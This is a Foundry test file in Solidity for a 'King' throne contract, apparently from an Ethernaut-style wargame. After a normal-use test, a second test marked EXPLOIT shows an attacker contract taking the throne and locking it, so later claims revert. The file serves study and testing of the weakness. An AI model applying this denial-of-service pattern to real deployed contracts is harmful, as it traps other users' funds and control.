//SPDX-License-Identifer: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {DeployKingScript} from "../script/DeployKingScript.s.sol";
import {AttackKing} from "../src/AttackKing.sol";
import {King} from "../src/King.sol";

contract TestKing is Test{

    DeployKingScript deploy;
    King public kingContract;
    AttackKing public attack;

     
        
    address public ghost = makeAddr("ghost");
    address public spider = makeAddr("spider");
    address public firstKing = makeAddr("firstKing");
    uint256 public constant STARTING_BALANCE = 5 ether;

    function setUp() public {
        deploy = new DeployKingScript();
        kingContract = deploy.run();
        attack = new AttackKing();

        vm.deal(spider, 10 ether);
        vm.deal(ghost, 10 ether);
    }

    /*//////////////////////////////////////////////////////////////
                           IF KING IS A USER
    //////////////////////////////////////////////////////////////*/

    function testKingChangedIfCalledByaUSER() public {
        //Arrange 1
        vm.deal(firstKing, STARTING_BALANCE);
        vm.startPrank(firstKing);
        //Act 1
        (bool success,) = address(kingContract).call{value: STARTING_BALANCE}("");
        require(success,"First King failed to throne");
        vm.stopPrank();
        //Assert 1
        assertEq(kingContract._king(), firstKing);
        assertEq(kingContract.prize(), STARTING_BALANCE);

        //Arrange 2
        
        vm.startPrank(spider);
        //Act 2
        (bool success1,) = address(kingContract).call{value: 6 ether}("");
        require(success1, "New King Failed TO throne");
        
        vm.stopPrank();
        //Assert 2
        assertEq(kingContract._king(), spider);
        assertEq(kingContract.prize(), 6 ether);

        //Arrange 3
        vm.startPrank(ghost);
        //Act 3 
        (bool success2,) = address(kingContract).call{value: 7 ether}("");
        require(success2, "New King Failed To Throne");
        vm.stopPrank();
        //Assert 3 
        assertEq(kingContract._king(), ghost);
        assertEq(kingContract.prize(), 7 ether);

    }

    /*//////////////////////////////////////////////////////////////
                                EXPLOIT
    //////////////////////////////////////////////////////////////*/

    function testIfKingChangedifCalledByaContract() public {
        vm.deal(firstKing, STARTING_BALANCE);

        vm.startPrank(firstKing);
        //Act 
        (bool success,) = address(kingContract).call{value: STARTING_BALANCE}("");
        require(success,"First King failed to throne");
        vm.stopPrank();

        //Assert 
        assertEq(kingContract._king(), firstKing);
        assertEq(kingContract.prize(), STARTING_BALANCE);

        //Arrange 2
        vm.deal(address(attack), 10 ether);
        vm.startPrank(address(attack));
        //Act 2
        (bool success1,) = address(kingContract).call{value: 6 ether}("");
        require(success1, "New King Failed TO throne");
        
        vm.stopPrank();
        //Assert 2
        assertEq(kingContract._king(), address(attack));
        assertEq(kingContract.prize(), 6 ether);


        //Arrange 3
        vm.startPrank(ghost);
        //Act 3 
        vm.expectRevert();
        (bool success2,) = address(kingContract).call{value: 7 ether}("");
        require(success2, "New King2 Failed To Throne");
        vm.stopPrank();
        //Assert 3 
        assertEq(kingContract._king(), address(attack));
        assertEq(kingContract.prize(),6 ether);

    }


}